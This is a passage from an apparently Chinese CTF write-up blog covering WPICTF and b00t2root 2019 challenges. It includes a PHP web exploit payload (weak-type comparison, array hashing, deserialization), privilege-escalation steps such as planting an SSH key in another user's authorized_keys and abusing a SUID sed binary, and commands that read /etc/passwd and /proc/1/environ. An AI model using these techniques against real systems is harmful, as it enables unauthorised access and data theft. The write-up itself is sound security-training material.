INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.file=\"/etc/deadline\"cron() &#123; second=0 minute=0 hour=0 day=1; month=1; year=2019; while true; do sleep 1; target_second=`cut -d \" \" -f 6 $file` target_minute=`cut -d \" \" -f 5 $file` target_hour=`cut -d \" \" -f 4 $file` target_day=`cut -d \" \" -f 3 $file` target_month=`cut -d \" \" -f 2 $file` target_year=`cut -d \" \" -f 1 $file` if [[ \"$second\" -eq 59 ]]; then minute=$((minute+1)); second=0; elif [[ \"$minute\" -eq 59 ]]; then hour=$((hour+1)); second=0; minute=0; else second=$((second+1)); fi if [[ \"$year\" -eq \"$target_year\" ]] \\ &amp;&amp; [[ \"$month\" -eq \"$target_month\" ]] \\ &amp;&amp; [[ \"$day\" -eq \"$target_day\" ]] \\ &amp;&amp; [[ \"$hour\" -eq \"$target_second\" ]] \\ &amp;&amp; [[ \"$minute\" -eq \"$target_minute\" ]] \\ &amp;&amp; [[ \"$second\" -eq \"$target_hour\" ]]; then # echo \"WPI&#123;&#125;\" &gt; /home/ctf/flag.txt exec_flag fi rm /etc/faketimerc echo \"$year-$month-$day $hour:$minute:$second\" &gt; /etc/faketimerc done&#125;cron &amp; 发现只要在/etc/faketimerc中的时间和/etc/deadline中的值相同的时候，就会在家目录生成 flag： 1234567891011sh-4.4$ cat /etc/faketimerc2019-1-1 0:0:11sh-4.4$ cat /etc/deadline2020 1 1 0 1 0sh-4.4$ echo \"2019 1 1 0 2 0\" &gt; /etc/deadlinesh-4.4$ cat /etc/faketimerc2019-1-1 0:2:51sh-4.4$ ls /home/ctf/flag.txtsh-4.4$ cat /home/ctf/flag.txt\"WPI&#123;L1nUxH@ck3r01a4&#125;\" Referenceshttps://www.cyberciti.biz/faq/linux-unix-shell-programming-converting-lowercase-uppercase/https://dark-lambda.com/2019/04/14/ctf/bytebandits-ctf-2019/bash-fu/https://www.youtube.com/watch?v=RgcchGiTxpkhttps://infosec.rm-it.de/2019/04/15/wpictf-2019-linux-category/https://blog.51cto.com/shjia/1427138https://www.netkiller.cn/cryptography/openssl/index.htmlhttp://man.linuxde.net/opensslhttps://www.cnblogs.com/wang_yb/p/3804200.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"},{"name":"linux","slug":"linux","permalink":"blog.b3ale.cn/tags/linux/"}]},{"title":"2019-b00t2root-CTF","slug":"2019-b00t2root-CTF","date":"2019-03-31T09:47:36.000Z","updated":"2019-08-26T01:17:06.274Z","comments":true,"path":"2019/03/31/2019-b00t2root-CTF/","link":"","permalink":"blog.b3ale.cn/2019/03/31/2019-b00t2root-CTF/","excerpt":"这个比赛有一类 linux 的题，感觉很有意思。","text":"这个比赛有一类 linux 的题，感觉很有意思。 webEasyPhp题目如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phpinclude \"flag.php\";highlight_file(__FILE__);error_reporting(0);$str1 = $_GET['1'];if(isset($_GET['1']))&#123; if($str1 == md5($str1))&#123; echo $flag1; &#125; else&#123; die(); &#125;&#125;else&#123; die();&#125;$str2 = $_GET['2'];$str3 = $_GET['3'];if(isset($_GET['2']) &amp;&amp; isset($_GET['3']))&#123; if($str2 !== $str3)&#123; if(hash('md5', $salt . $str2) == hash('md5', $salt . $str3))&#123; echo $flag2; &#125; else&#123; die(); &#125; &#125; else&#123; die(); &#125;&#125;else&#123; die();&#125;?&gt;&lt;?phpclass Secrets &#123; var $temp; var $flag;&#125;if (isset($_GET['4'])) &#123; $str4 = $_GET['4']; if(get_magic_quotes_gpc())&#123; $str4=stripslashes($str4); &#125; $res = unserialize($str4); if ($res) &#123; $res-&gt;flag=$flag3; if ($res-&gt;flag === $res-&gt;temp) echo $res-&gt;flag; else die(); &#125; else die();&#125;?&gt; 第一个 check 是弱类型比较，第二个 check 是数组 hash 后返回 null，最后一个则是php 反序列化。payload 如下： 1http://3.16.68.122/Easy-php/?1=0e215962017&amp;2[]=a&amp;3[]=b&amp;4=O:7:%22Secrets%22:2:&#123;s:4:%22temp%22;N;s:4:%22flag%22;R:2;&#125; cryptoScatter Me11:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;2:1.75:1;2:1.5:1;1:2.25:1;1.25:2.25:1;1.5:2.25:1;1.75:2.25:1;1:1.5:1;1.25:1.5:1;1.5:1.5:1;1.75:1.5:1;3:3:1;3.25:3:1;3.5:3:1;3.75:3:1;4:3:1;4:2.75:1;4:2.5:1;4:2.25:1;4:2:1;4:1.75:1;4:1.5:1;3:1.5:1;3.25:1.5:1;3.5:1.5:1;3.75:1.5:1;3:1.75:1;3:2:1;3:2.25:1;3:2.5:1;3:2.75:1;5:3:1;5.25:3:1;5.5:3:1;5.75:3:1;6:3:1;6:2.75:1;6:2.5:1;6:2.25:1;6:2:1;6:1.75:1;6:1.5:1;5.75:1.5:1;5.5:1.5:1;5.25:1.5:1;5:1.5:1;5:1.75:1;5:2:1;5:2.25:1;5:2.5:1;5:2.75:1;7:3:1;7.25:3:1;7.5:3:1;7.75:3:1;8:3:1;8:2.75:1;8:2.5:1;8:2.25:1;8:2:1;8:1.75:1;8:1.5:1;9:3:1;9.25:3:1;9.5:3:1;9.75:3:1;10:3:1;10:2.75:1;10:2.5:1;10:2.25:1;9.75:2.25:1;9.5:2.25:1;9.25:2.25:1;9:2.25:1;9:2:1;9:1.75:1;9:1.5:1;9.25:1.5:1;9.5:1.5:1;9.75:1.5:1;10:1.5:1;11:3:1;11.25:3:1;11.5:3:1;11.75:3:1;12:3:1;12:2.75:1;12:2.5:1;12:2.25:1;12:2:1;12:1.75:1;12:1.5:1;11.75:1.5:1;11.5:1.5:1;11.25:1.5:1;11:1.5:1;11:1.75:1;11:2:1;11:2.25:1;11:2.5:1;11:2.75:1;11.25:2.25:1;11.5:2.25:1;11.75:2.25:1 仔细观察可以发现其实是一组三维坐标，而且 z 轴都为一，可以当作是二维的。用 python 还原出来： 1234567891011121314#!/usr/bin/env pythonimport numpy as npimport matplotlib.pyplot as pltf = open('scatter.txt', 'rb')cords = f.read().split(';')f.close()x, y, z = [], [], []for i in cords: x.append(float(i.split(':')[0])) y.append(float(i.split(':')[1])) # z.append(float(i.split(':')[2]))plt.scatter(x, y) # , z)plt.show() linuxSteve RogersSteve knows there’s a flag somewhere in plain sight. Login as steve and find it for him. 给了一个 socat 的脚本，连上去以后是一个 docker。看了一下steve家目录下没有什么东西，隐藏文件也是一些没用的像是.bashrc还有.profile之类的文件。可以先试试cat /etc/passwd能不能用，看看服务器上有哪些用户： 123456789101112131415161718192021222324252627steve@d18fb074a417:~$ lssteve@d18fb074a417:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinmessagebus:x:103:104::/nonexistent:/usr/sbin/nologinsshd:x:104:65534::/run/sshd:/usr/sbin/nologinsteve:x:1000:1000:,,,:/home/steve:/bin/bashtony:x:1001:0:,,,:/home/tony:/bin/bash 可以看到除了一开始的root，最下面还有steve和tony两个用户，上面还有一个sshd，说明服务器上起了 ssh。这里推荐一个关于Linux 提权基础（Basic Linux Privilege Escalation）的网站，上面提供了很多可以提权的小命令。我们先用ps aux做一个尝试，查看有什么服务正在跑着，以及哪些用户对应着哪些服务： 123456789steve@d18fb074a417:~$ ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 18376 3108 pts/0 Ss 09:52 0:00 bash /tmp/42.shroot 14 0.0 0.0 72296 3408 ? Ss 09:52 0:00 /usr/sbin/sshdroot 16 0.0 0.0 55952 3344 pts/0 S 09:52 0:00 su -l stevesteve 18 0.0 0.0 18508 3444 pts/0 S 09:52 0:00 -susteve 25 0.0 0.0 34400 3028 pts/0 R+ 09:55 0:00 ps auxsteve@d18fb074a417:~$ cat /tmp/42.shcat: /tmp/42.sh: No such file or directory 可以看到一个bash /tmp/42.sh很引人注目，但是试图打开它的时候失败了。再试试ps -ef，man一下看看这两个参数： 123456789... -A Display information about other users&apos; processes, including those without controlling terminals.... -e Identical to -A. -f Display the uid, pid, parent pid, recent CPU usage, process start time, controlling tty, elapsed CPU usage, and the asso- ciated command. If the -u option is also used, display the user name rather then the numeric uid. When -o or -O is used to add to the display following -f, the command field is not truncated as severely as it is in other formats.... 也就是显示uid、pid、ppid等相关信息，然后看看输出： 1234567steve@d18fb074a417:~$ ps -efUID PID PPID C STIME TTY TIME CMDroot 1 0 0 09:52 pts/0 00:00:00 bash /tmp/42.sh b00t2root&#123;Cmd_l1root 14 1 0 09:52 ? 00:00:00 /usr/sbin/sshdroot 16 1 0 09:52 pts/0 00:00:00 su -l stevesteve 18 16 0 09:52 pts/0 00:00:00 -susteve 27 18 0 09:56 pts/0 00:00:00 ps -ef 我们在 pid 为 1 的进程中看到了bash /tmp/42.sh b00t2root{Cmd_l1，不是很完整的一条 flag。本着 linux 下一切皆文件的思想，我们可以在/proc/1/下找到一个文件cmdline，flag 就在里面： 1234567891011121314151617steve@d18fb074a417:~$ ls /proc/1/ls: cannot read symbolic link '/proc/1/cwd': Permission deniedls: cannot read symbolic link '/proc/1/root': Permission deniedls: cannot read symbolic link '/proc/1/exe': Permission deniedattr exe mounts projid_map statusautogroup fd mountstats root syscallauxv fdinfo net sched taskcgroup gid_map ns schedstat timersclear_refs io numa_maps sessionid timerslack_nscmdline limits oom_adj setgroups uid_mapcomm loginuid oom_score smaps wchancoredump_filter map_files oom_score_adj smaps_rollupcpuset maps pagemap stackcwd mem patch_state statenviron mountinfo personality statmsteve@d18fb074a417:~$ cat /proc/1/cmdlinebash/tmp/42.shb00t2root&#123;Cmd_l1n3_fl4g5_4r3_0bv10u5&#125;steve@d18fb074a417:/home/tony$ Tony StankProfessor Hulk requires a flag hidden in tony‘s account to wield the infinity gauntlet. Retrieve it for him by any means necessary. 我们在上一道题目中发现服务器是开了 ssh 的，在这道题会派上很大的用场。我们尝试进到 tony 的家目录： 123456789101112steve@e2797a47d8f5:~$ cd /home/tonysteve@e2797a47d8f5:/home/tony$ ls -latotal 24drwxrwxrwx 1 tony root 4096 Mar 29 15:30 .drwxr-x--x 1 root root 4096 Mar 29 15:30 ..-rw-r--r-- 1 tony root 220 Mar 29 15:30 .bash_logout-rw-r--r-- 1 tony root 3771 Mar 29 15:30 .bashrc---------- 1 tony root 38 Mar 29 15:28 .flag-rw-r--r-- 1 tony root 807 Mar 29 15:30 .profilesteve@e2797a47d8f5:/home/tony$ touch anythingsteve@e2797a47d8f5:/home/tony$ lsanything 看到了一个.flag文件，很有可能就是我们要找的 flag。然而所属用户是 tony，我们需要想办法变成 tony。因为本地是开了 ssh 的，我们可以在 steve 的家目录生成 ssh 密钥和公钥，并将公钥复制到/home/tony/.ssh/authorized_keys中，这样我们如果从本地 ssh 访问 tony 就不需要输入密码了。可以把用户变成 tony： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465steve@e2797a47d8f5:/home/tony$ mkdir .sshsteve@e2797a47d8f5:/home/tony$ ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/home/steve/.ssh/id_rsa):Created directory '/home/steve/.ssh'.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /home/steve/.ssh/id_rsa.Your public key has been saved in /home/steve/.ssh/id_rsa.pub.The key fingerprint is:SHA256:Dy7aH7T8rwupoal6mTAT/uFk2kL0ZoMRp5NNAirlxq4 steve@e2797a47d8f5The key's randomart image is:+---[RSA 2048]----+|o . ||.* o ||o % ||oO . ||o.* S ||+= O + = ||E+Xoo o B . || o++ = + + ||.oo.+ o.. ++. |+----[SHA256]-----+steve@e2797a47d8f5:/home/tony$ ls ~/.sshid_rsa id_rsa.pubsteve@e2797a47d8f5:/home/tony$ cat ~/.ssh/id_rsa.pub &gt;.ssh/authorized_keyssteve@e2797a47d8f5:/home/tony/.ssh$ cat .ssh/authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzOsnxC56QPjbS2Glioff2IO/z/eTpRkOPqNv0qxzRvcwIJpOom8GHU6ae7VOs4466EIUbxIO1oK3xV81CrfCOITUcZ0WCYohVUfY1w0MM65ILQ4SGUdhNiVP9dnu8N/RVfIrcs9dc4Wlb+KixmgURhW9bX6F5As+7iHqCiqpsDN4fyq78lC9ci+Rgg9fgVkboSeMIiqaUK/Ww0W7lwe0mGm4UaTc94CSQRdRrnOutDNKFeLXYl46s+V7pHtFrmSaYZoNI09IkllWcaA4WYlXdGD8qHGwpkptCUjgufkl1e2DetLNTeuwtbj4DhY7af1r9+Vdaa089yeGrgAemgyo9 steve@e2797a47d8f5steve@e2797a47d8f5:/home/tony/.ssh$ ssh -i ~/.ssh/id_rsa tony@localhostThe authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:n6A8y008mc7HfJYLy8Fw7nexXjofQ8J/ZOQmEtk2TX0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-1032-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantageThis system has been minimized by removing packages and content that arenot required on a system that users do not log into.To restore this content, you can run the 'unminimize' command.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.tony@e2797a47d8f5:~$ iduid=1001(tony) gid=0(root) groups=0(root)tony@e2797a47d8f5:~$ ls -altotal 36drwxrwxrwx 1 tony root 4096 Mar 31 11:38 .drwxr-x--x 1 root root 4096 Mar 29 15:30 ..-rw-r--r-- 1 tony root 220 Mar 29 15:30 .bash_logout-rw-r--r-- 1 tony root 3771 Mar 29 15:30 .bashrcdrwx------ 2 tony root 4096 Mar 31 11:38 .cache---------- 1 tony root 38 Mar 29 15:28 .flag-rw-r--r-- 1 tony root 807 Mar 29 15:30 .profiledrwxrwxr-x 2 steve steve 4096 Mar 31 11:37 .ssh-rw-rw-r-- 1 steve steve 0 Mar 31 11:34 anythingtony@e2797a47d8f5:~$ cat .flagcat: .flag: Permission denied 变成 tony 后，发现依然无法查看，因为无论是哪个用户，对.flag文件没有任何权限。我们尝试进行提权： 123456789101112tony@e2797a47d8f5:~$ find / -perm -u=s -type f 2&gt;/dev/null/bin/sed/bin/mount/bin/umount/bin/su/usr/bin/gpasswd/usr/bin/passwd/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign 注：在类 Unix 系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据，读取它则会立即得到一个 EOF。 在程序员行话，尤其是 Unix 行话中，/dev/null 被称为比特桶或者黑洞。 查找到一些我们能够执行并获取更高权限的一些命令，涉及到一些SUID 的知识。 123456steve@d18fb074a417:~$ ls -l /bin/sed-rwxrwx--- 1 root root 109000 Jan 30 2018 /bin/sedsteve@d18fb074a417:~$ /bin/sed-su: /bin/sed: Permission deniedtony@e2797a47d8f5:~$ iduid=1001(tony) gid=0(root) groups=0(root) 我们发现 steve 是无法执行/bin/sed的，然而 tony 在 root 这个用户组中，是可以执行的。了解一下如何通过 sed 查看文件（在上个礼拜的 Securinets 中也有涉及），然后就能拿到 flag： 12tony@e2797a47d8f5:~$ /bin/sed '' .flagb00t2root&#123;1_h0p3_ssh_15_th3_0nly_w4y&#125; GrootWe know Groot’s no more but we can still hear him in the environment. Can you? 根据提示可以知道 flag 基本上是在环境变量里： 123456789101112131415tony@e2797a47d8f5:~$ envLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:SSH_CONNECTION=127.0.0.1 57394 127.0.0.1 22USER=tonyPWD=/home/tonyHOME=/home/tonySSH_CLIENT=127.0.0.1 57394 22SSH_TTY=/dev/pts/1MAIL=/var/mail/tonyTERM=xtermSHELL=/bin/bashSHLVL=1LOGNAME=tonyPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games_=/usr/bin/env 还是在/proc/1/下查看environ，没有权限。因为我们现在是 tony，直接用 sed 就能查看，得到 flag： 123456789101112131415tony@e2797a47d8f5:~$ ps -auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 18376 3044 pts/0 Ss 11:28 0:00 bash /tmp/42.shroot 14 0.0 0.0 72296 3356 ? Ss 11:28 0:00 /usr/sbin/sshdroot 16 0.0 0.0 55952 3300 pts/0 S 11:28 0:00 su -l stevesteve 18 0.0 0.0 18508 3412 pts/0 S 11:28 0:00 -susteve 64 0.0 0.0 45188 5572 pts/0 S+ 11:56 0:00 ssh -i /home/stroot 65 0.0 0.0 103852 7340 ? Ss 11:56 0:00 sshd: tony [pritony 80 0.0 0.0 103852 3528 ? R 11:56 0:00 sshd: tony@pts/tony 81 0.0 0.0 18508 3500 pts/1 Ss 11:56 0:00 -bashtony 91 0.0 0.0 36700 3140 pts/1 R+ 11:58 0:00 ps -auxtony@e2797a47d8f5:~$ cat /proc/1/environcat: /proc/1/environ: Permission deniedtony@e2797a47d8f5:~$ sed '' /proc/1/environPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=e2797a47d8f5TERM=xtermflag=b00t2root&#123;1_44aaaaaammmm_gr0000000ooooooOOO7777&#125;HOME=/root forensicskey_me_baby用 wireshark 打开后发现都是 usb 流量。用 tshark 把流量导出（中间几个 grep 把非 usb 流量筛选掉）： 1tshark -r data.pcapng -T fields -e usb.capdata | grep -E \"^.&#123;23&#125;$\" | grep -v 00:00:00:00:00:00:00:00 &gt; usbdata.txt 然后用脚本跑（之前 XMan 个人赛的时候用过的脚本）： 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env pythonnormalKeys = &#123;\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;shiftKeys = &#123;\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"&#123;\",\"30\":\"&#125;\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;output = []keys = open('usbdata.txt')for line in keys: try: if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]==\"00\": continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2'] else: output += ['[unknown]'] except: passkeys.close()flag=0print(\"\".join(output))for i in range(len(output)): try: a=output.index('&lt;DEL&gt;') del output[a] del output[a-1] except: passfor i in range(len(output)): try: if output[i]==\"&lt;CAP&gt;\": flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint ('output :' + \"\".join(output)) loopback追踪 tcp 流，把服务器传回客户端的文件导出后，得到一张图片。strings 一下得到 flag： 123$ strings data.png...B00t2root&#123;i_am_the_flag_format&#125; Referenceshttps://www.youtube.com/watch?v=P5RloHad34Qhttps://www.youtube.com/watch?v=68Tgdx_Y8nghttps://www.youtube.com/watch?v=Qg3qOjylZpwhttps://www.youtube.com/watch?v=RmGl1mje1Hohttps://github.com/ziyedbe/b00t2root-19/tree/master/Scatter%20Me","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2019-Securinets-CTF-Quals","slug":"2019-Securinets-CTF-Quals","date":"2019-03-25T00:45:10.000Z","updated":"2019-08-26T01:16:29.378Z","comments":true,"path":"2019/03/25/2019-Securinets-CTF-Quals/","link":"","permalink":"blog.b3ale.cn/2019/03/25/2019-Securinets-CTF-Quals/","excerpt":"比赛的时候做了四道题，顺便复现几道没做出来的题目。","text":"比赛的时候做了四道题，顺便复现几道没做出来的题目。 ReversingAutomateMe12root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# file ./bin./bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=cbafec6cc96cbdd6feea8085adeeafb3fc05c11f, not stripped 用 radare2 分析一下： 12345678910111213141516171819202122232425262728293031root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# radare2 ./bin -- Execute commands on a temporary offset by appending &apos;@ offset&apos; to your command.[0x000005d0]&gt; aaa[Invalid instruction of 16368 bytes at 0x124 entry0 (aa)Invalid instruction of 16366 bytes at 0x124[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)...[x] Type matching analysis for all functions (aaft)[x] Use -AA or aaaa to perform additional experimental analysis.[0x000005d0]&gt; s main[0x000006da]&gt; pdfLinear size differs too much from the bbsum, please use pdr instead.[0x000006da]&gt; pdrDo you want to print 1316 lines? (y/N) y...| 0x00000786 3c68 cmp al, 0x68 ; &apos;h&apos;| ; DATA XREF from main (+0x173d3)| 0x00000788 7416 je 0x7a0| ----------- true: 0x000007a0 false: 0x0000078a| ; DATA XREF from main (+0x1742f)| 0x0000078a 488d3de57c02. lea rdi, str.nope_: ; 0x28476 ; &quot;nope :( &quot; ; const char *format| ; DATA XREF from main (+0x1758d)| 0x00000791 b800000000 mov eax, 0| ; DATA XREF from main (+0x17681)| 0x00000796 e815feffff call sym.imp.printf ; int printf(const char *format)| ; DATA XREF from main (+0x1776e)| 0x0000079b e9007c0200 jmp 0x283a0... 在0x00000786处可以看到将输入的某个字符与h进行了比较。 1234567891011121314151617181920...| ----------- true: 0x000283a0| ; CODE XREF from main (0x788)| ; DATA XREF from main (+0x17869)| 0x000007a0 488b45e0 mov rax, qword [s]| ; DATA XREF from main (+0x17928)| 0x000007a4 4883c008 add rax, 8| ; DATA XREF from main (+0x179e7)| 0x000007a8 488b00 mov rax, qword [rax]| ; DATA XREF from main 